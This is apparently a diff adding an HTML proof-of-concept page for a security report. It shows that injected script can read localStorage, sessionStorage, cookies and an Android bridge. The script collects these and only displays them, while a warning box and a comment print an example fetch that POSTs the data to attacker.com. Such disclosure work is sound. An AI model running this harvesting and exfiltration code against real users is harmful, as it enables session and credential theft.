@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Storage Exposure PoC</title>
+    <meta charset="UTF-8" />
+    <style>
+        body {
+            font-family: sans-serif;
+            padding: 16px;
+            background: #f5f5f5;
+        }
+        h1 {
+            font-size: 20px;
+        }
+        pre {
+            background: #222;
+            color: #eee;
+            padding: 12px;
+            border-radius: 4px;
+            overflow-x: auto;
+            font-size: 12px;
+        }
+        .warning {
+            margin-top: 12px;
+            padding: 10px;
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Storage & Cookie Data Accessible via XSS</h1>
+    <p>
+        The script below demonstrates that JavaScript running in this context can read
+        <strong>localStorage</strong>, <strong>sessionStorage</strong>, <strong>cookies</strong>,
+        and interact with the native bridge (if present).
+    </p>
+
+    <div class="warning">
+        <strong>Note (for PoC only):</strong> In this demo we only <em>display</em> the data
+        on the page. A real attacker could instead send this JSON to an external server, e.g.:
+        <code>fetch('https://attacker.com/exfiltrate', {{ method: 'POST', body: JSON.stringify(stolenData) }})</code>.
+    </div>
+
+    <h2>Collected Data</h2>
+    <pre id="output">Collecting...</pre>
+
+    <script>
+        // Exfiltrate localStorage (contains auth tokens, session data)
+        const localStorageData = {};
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            localStorageData[key] = localStorage.getItem(key);
+        }
+        
+        // Exfiltrate sessionStorage
+        const sessionStorageData = {};
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            sessionStorageData[key] = sessionStorage.getItem(key);
+        }
+        
+        // Exfiltrate cookies
+        const cookies = document.cookie;
+        
+        // Access Capacitor / Android bridge if available
+        let bridgeData = null;
+        if (window.androidBridge) {
+            try {
+                // Attempt to access native bridge
+                bridgeData = "Bridge available (window.androidBridge is defined)";
+            } catch (e) {
+                bridgeData = "Bridge access error: " + e.toString();
+            }
+        } else {
+            bridgeData = "No androidBridge detected on window";
+        }
+        
+        // Collect all data
+        const stolenData = {
+            localStorage: localStorageData,
+            sessionStorage: sessionStorageData,
+            cookies: cookies,
+            bridge: bridgeData,
+            userAgent: navigator.userAgent,
+            url: window.location.href,
+            timestamp: new Date().toISOString()
+        };
+
+        // Instead of sending to an external server, just render on the page as JSON
+        const pre = document.getElementById('output');
+        pre.textContent = JSON.stringify(stolenData, null, 2);
+
+        // For reporting purposes you can mention, e.g.:
+        // "An attacker-controlled script could replace this display with:
+        // fetch('https://attacker.com/exfiltrate', {
+        //     method: 'POST',
+        //     headers: { 'Content-Type': 'application/json' },
+        //     body: JSON.stringify(stolenData)
+        // });"
+    </script>
+</body>
+</html>
